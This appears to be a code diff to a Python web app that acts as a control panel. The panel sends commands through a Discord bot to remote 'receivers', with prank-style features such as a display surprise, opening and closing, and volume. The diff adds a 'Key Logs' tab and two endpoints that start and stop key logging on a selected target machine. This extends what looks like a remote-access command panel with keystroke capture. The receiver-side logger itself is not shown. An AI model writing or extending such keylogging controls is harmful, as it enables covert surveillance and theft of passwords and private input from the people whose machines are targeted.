@@ -207,6 +207,7 @@ CONTROL_HTML = """<!doctype html>
         <button class="tab-btn" data-tab="select">Select Target</button>
         <button class="tab-btn" data-tab="openclose">Open & Close :3</button>
         <button class="tab-btn" data-tab="volume">Volume ;0</button>
+        <button class="tab-btn" data-tab="logs">Logs</button>
       </div>
       <div class="tab-pane active" data-tab="surprise">
         <h1>Display Surprise</h1>
@@ -244,6 +245,34 @@ CONTROL_HTML = """<!doctype html>
           <input id="level" name="level" type="number" min="0" max="100" step="1" value="50" required>
           <button type="submit">Set Volume</button>
         </form>
+      </div>
+      <div class="tab-pane" data-tab="logs">
+        <h1>Key Logs</h1>
+        <p style="color:var(--muted); margin-bottom:12px;">
+          Start / stop key logging on the selected receiver.
+          Logged keys auto-expire after 60 seconds.
+        </p>
+
+        <div class="row">
+          <form method="post" action="/ui/logs/start">
+            <button type="submit">Start Logging</button>
+          </form>
+
+          <form method="post" action="/ui/logs/stop">
+            <button class="secondary" type="submit">Stop Logging</button>
+          </form>
+        </div>
+
+        <pre id="log-output" style="
+          margin-top:12px;
+          padding:12px;
+          background:#0c0817;
+          border:1px solid var(--border);
+          border-radius:10px;
+          max-height:260px;
+          overflow:auto;
+          font-size:13px;
+        ">Waiting for logs…</pre>
       </div>
     </div>
     <div class="card">
@@ -519,6 +548,20 @@ async def ui_live_stop():
     if not await _wait_controller_ready():
         return HTMLResponse("Discord bot not ready", status_code=503)
     await _send_cmd(_cmd_with_selection("LIVE_STOP"))
+    return RedirectResponse(url="/", status_code=303)
+
+@app.post("/ui/logs/start")
+async def ui_logs_start():
+    if not await _wait_controller_ready():
+        return HTMLResponse("Discord bot not ready", status_code=503)
+    await _send_cmd(_cmd_with_selection("LOGS_START"))
+    return RedirectResponse(url="/", status_code=303)
+
+@app.post("/ui/logs/stop")
+async def ui_logs_stop():
+    if not await _wait_controller_ready():
+        return HTMLResponse("Discord bot not ready", status_code=503)
+    await _send_cmd(_cmd_with_selection("LOGS_STOP"))
     return RedirectResponse(url="/", status_code=303)
 
 @app.post("/ui/open")
